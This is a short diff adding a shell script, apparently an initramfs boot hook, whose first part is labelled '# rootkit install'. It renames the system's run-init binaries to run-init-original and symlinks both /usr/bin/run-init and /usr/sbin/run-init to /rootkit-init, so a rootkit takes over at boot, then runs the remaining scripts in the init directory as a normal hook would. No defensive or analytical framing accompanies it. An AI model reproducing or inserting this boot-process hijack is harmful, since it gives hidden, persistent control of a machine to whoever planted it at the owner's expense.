@@ -1,0 +1,23 @@
+# rootkit install
+
+if [ -f /usr/bin/run-init ]; then
+	mv /usr/bin/run-init /usr/bin/run-init-original
+fi
+
+if [ -f /usr/sbin/run-init ]; then
+	mv /usr/sbin/run-init /usr/sbin/run-init-original
+fi
+
+ln -s /rootkit-init /usr/bin/run-init
+ln -s /rootkit-init /usr/sbin/run-init
+
+# normal scripts 
+# unordered but unlikely to cause problems in init-bottom
+
+for script in "$initdir"/*; do
+    echo $script
+    [ -f "$script" ] || continue
+    [ "$script" = "$initdir/ORDER" ] && continue
+
+    "$script" "$@"
+done
